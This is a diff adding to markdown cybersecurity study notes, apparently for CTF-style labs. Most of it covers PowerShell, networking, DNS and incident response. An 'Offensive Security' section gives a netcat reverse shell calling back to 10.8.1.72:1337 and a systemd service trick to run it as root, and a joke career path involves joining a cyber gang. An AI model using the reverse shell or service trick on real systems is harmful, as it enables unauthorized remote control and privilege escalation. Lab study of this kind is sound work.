@@ -105,3 +105,209 @@ sudo bash
 cat /root/root.txt
 
 
+
+
+## Career Paths in Cybersecurity
+### Traditional Path
+- Learn reverse engineering, malware analysis, and forensics.
+- Progression: Forensic Analyst → Researcher → Director → CISO → Security Consultant (Approx. 20 years).
+
+### Alternative Path
+- Learn reverse engineering and malware analysis.
+- Join a cyber gang, commit a major hack, serve jail time.
+- Upon release, become a highly-paid security consultant (Approx. 3 years, or 2 with good behavior).
+
+---
+
+## Common File Locations
+- **Tools**: `/root/Desktop/Tools` & `/opt/`
+- **Webshells**: `/usr/share/webshells`
+- **Wordlists**: `/usr/share/wordlists`
+- **READMEs**: `/root/Instructions`
+- **Empire & Starkiller Guide**: `/root/Instructions/empire-starkiller.txt`
+
+---
+
+## Offensive Security
+### Finding SUID Files
+```bash
+find / -user root -perm -4000 -exec ls -ldb {} \;
+```
+
+### Reverse Shell
+```bash
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.1.72 1337 >/tmp/f" > /tmp/shell.sh
+```
+Create a service to execute it:
+```bash
+TF=$(mktemp).service
+
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "bash /tmp/shell.sh"
+[Install]
+WantedBy=multi-user.target' > $TF
+
+/bin/systemctl link $TF
+/bin/systemctl enable --now $TF
+```
+
+### Finding Flags
+```bash
+dir flag* /s /p
+search -f "flag*"
+```
+
+---
+
+## PowerShell Basics
+### Common Verbs
+- Get, Start, Stop, Read, Write, New, Out
+
+### Getting Help
+```powershell
+Get-Help Command-Name
+Get-Help Get-Command -Examples
+```
+
+### Listing Commands
+```powershell
+Get-Command Verb-*
+Get-Command *-Noun
+```
+
+### Object Manipulation
+```powershell
+Verb-Noun | Where-Object -Property PropertyName -operator Value
+Verb-Noun | Where-Object {$_.PropertyName -operator Value}
+```
+
+### File Operations
+```powershell
+Get-ChildItem -Path C:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
+Get-FileHash 'C:\Program Files\interesting-file.txt' -Algorithm MD5
+```
+
+### Network Operations
+```powershell
+Get-NetIPAddress
+Get-NetTCPConnection -State Listen -LocalPort 445
+```
+
+### Checking Installed Patches
+```powershell
+Get-HotFix | Measure
+```
+
+---
+
+## Incident Response Phases
+1. **Preparation**: Train teams, implement preventive measures.
+2. **Detection & Analysis**: Monitor and analyze threats.
+3. **Containment, Eradication, & Recovery**: Stop spread, remove threats, restore systems.
+4. **Post-Incident Activity**: Document lessons learned and improve defenses.
+
+---
+
+## OSI Model (PDN TSPA)
+1. **Physical**: Electrical signals, binary transmission.
+2. **Data Link**: MAC addressing, NIC identification.
+3. **Network**: Routing, optimal path determination.
+4. **Transport**: TCP/UDP, reliability, segmentation.
+5. **Session**: Connection management.
+6. **Presentation**: Data translation, encryption.
+7. **Application**: User interfaces, DNS, email, browsing.
+
+### TCP vs. UDP
+**TCP**
+- Reliable, error-checked.
+- Slower, requires continuous connection.
+
+**UDP**
+- Faster, stateless.
+- No guarantee of data delivery.
+
+---
+
+## Firewalls
+- **Stateful**: Tracks full session, high resource usage.
+- **Stateless**: Packet-based filtering, lower resource usage.
+
+---
+
+## VPN Technologies
+- **PPP**: Authentication, encryption.
+- **PPTP**: Basic VPN tunneling, weak encryption.
+- **IPSec**: Strong encryption, complex setup.
+
+---
+
+## DNS Records
+- **A Record**: IPv4 address.
+- **AAAA Record**: IPv6 address.
+- **CNAME**: Aliases domain to another domain.
+- **MX Record**: Mail server details.
+- **TXT Record**: Miscellaneous text-based storage.
+
+### DNS Resolution Process
+1. **Local Cache** → 2. **Recursive DNS** → 3. **Root DNS** → 4. **TLD DNS** → 5. **Authoritative DNS**
+
+# DNS Resolution (Noob Version)
+
+1. **Local Cache** 🧠  
+   - Your computer checks if it already knows the website’s IP.
+
+2. **Recursive DNS** 🔄  
+   - If not, it asks a helper (ISP’s DNS or Google DNS).
+
+3. **Root DNS** 🌍  
+   - The helper asks the "internet bosses" where to look next.
+
+4. **TLD DNS** 🏷️  
+   - The bosses send it to the right category (like `.com`, `.net`).
+
+5. **Authoritative DNS** 🎯  
+   - The final server gives the exact IP, and boom! The website loads.  
+
+---
+
+## TCP Handshake Process
+1. SYN (Client → Server)
+2. SYN/ACK (Server → Client)
+3. ACK (Client → Server)
+4. Data Transmission
+5. FIN (Closing Connection)
+
+---
+
+## Miscellaneous
+- **Router**: Used for port forwarding.
+- **Packet**: Contains IP addressing info.
+- **Frame**: No IP addressing info.
+- **Firewall Types**: Stateful (connection-aware) vs. Stateless (packet-based filtering).
+
+For a complete list of common ports, refer to: [Common Ports List](https://www.vmaxx.net/techinfo/ports.htm)
+
+---
+
+## Useful Commands
+### Windows
+```powershell
+Get-LocalUser # List all users
+Get-NetTCPConnection -State Listen -LocalPort 445 # Check active connections
+Get-HotFix | Measure # Count installed patches
+```
+
+### Linux
+```bash
+find / -user root -perm -4000 -exec ls -ldb {} \; # Find SUID files
+dir flag* /s /p # Search for flags
+search -f "flag*" # Alternative flag search
+```
+
+---
+
+
+
+
+
